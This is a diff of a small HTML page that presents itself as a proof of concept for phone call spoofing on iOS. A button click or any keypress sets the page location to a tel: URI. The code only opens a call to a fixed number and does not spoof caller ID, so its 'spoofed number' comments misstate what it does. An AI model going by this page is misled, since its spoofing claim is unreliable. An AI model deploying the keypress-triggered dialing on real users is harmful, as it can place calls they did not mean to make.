@@ -4,25 +4,58 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Phone Call Spoofing on iOS</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 20px;
+    }
+    h2 {
+      font-size: 24px;
+    }
+    p {
+      font-size: 18px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-  <center><h2>PoC for Phone Call Spoofing on iOS</h2></center>
+  <h2>PoC for Phone Call Spoofing on iOS</h2>
+
+  <p>Click the button below to initiate a spoofed phone call.</p>
+  
+  <!-- Button to trigger phone call -->
+  <button id="callButton">Make Phone Call</button>
 
   <script>
-    // Listen for a keydown event to trigger the phone call
-    window.addEventListener('keydown', function(e) {
+    // Function to initiate the phone call
+    function initiatePhoneCall() {
+      // Replace with any phone number (spoofed number here)
+      const spoofedPhoneNumber = "tel:+11234567890"; // Example number, replace as needed
+      window.location.href = spoofedPhoneNumber;
+    }
+
+    // Adding event listener to the button
+    document.getElementById('callButton').addEventListener('click', function() {
       initiatePhoneCall();
     });
 
-    // Function to trigger the phone call with a spoofed number (e.g., fake phone number)
-    function initiatePhoneCall() {
-      // This is a spoofed phone number using the 'tel:' URI scheme
-      // You can replace this with any valid phone number you want to spoof
-      const spoofedPhoneNumber = "tel:+11234567890"; // Fake phone number
-      window.location.href = spoofedPhoneNumber;
-    }
+    // Listen for keyboard input (optional for trigger)
+    window.addEventListener('keydown', function() {
+      initiatePhoneCall();
+    });
   </script>
 
-  <p>Press any key to initiate a phone call.</p>
 </body>
 </html>
